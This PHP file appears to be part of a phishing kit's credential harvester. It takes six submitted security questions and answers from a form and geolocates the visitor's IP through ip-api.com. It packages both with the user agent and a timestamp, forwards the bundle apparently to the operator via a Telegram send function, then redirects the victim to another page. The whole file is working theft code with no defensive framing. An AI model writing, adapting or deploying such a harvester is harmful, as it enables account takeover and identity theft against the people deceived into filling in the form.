<?php
session_start();
require "config.php";

function visitor_location()
{
    $ip = $_SERVER["REMOTE_ADDR"];
    if (!empty($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
    } elseif (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
        $ip = explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"])[0];
    }

    $location = [
        "country" => "Unknown",
        "city" => "Unknown",
        "state" => "Unknown",
        "ip" => $ip,
    ];

    $ch = curl_init("http://ip-api.com/json/{$ip}");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    if ($response) {
        $data = json_decode($response);
        if ($data && $data->status === "success") {
            $location["country"] = $data->country;
            $location["city"] = $data->city;
            $location["state"] = $data->regionName;
        }
    }
    return $location;
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $location = visitor_location();
    $browser = $_SERVER["HTTP_USER_AGENT"];
    $adddate = date("D M d, Y g:i a");

    $message = "      _______
  ___//       \\

  @tomkinsc


Question 1 : {$_POST["q1"]}
answer 1 : {$_POST["ans1"]}
Question 2 : {$_POST["q2"]}
answer 2 : {$_POST["ans2"]}
Question 3 : {$_POST["q3"]}
Qanswer 3 : {$_POST["ans3"]}
Question 4 : {$_POST["q4"]}
Qanswer 4 : {$_POST["ans4"]}
Question 5 : {$_POST["q5"]}
Qanswer 5 : {$_POST["ans5"]}
Question 6 : {$_POST["q6"]}
Qanswer 6 : {$_POST["ans6"]}




Country : {$location["country"]}
IP Address : {$location["ip"]}
City : {$location["city"]}
State : {$location["state"]}
Date : $adddate
User-Agent: $browser
----------------------------------------";

    send_telegram_msg($message);
}

header("Location: indexem.php");
exit();
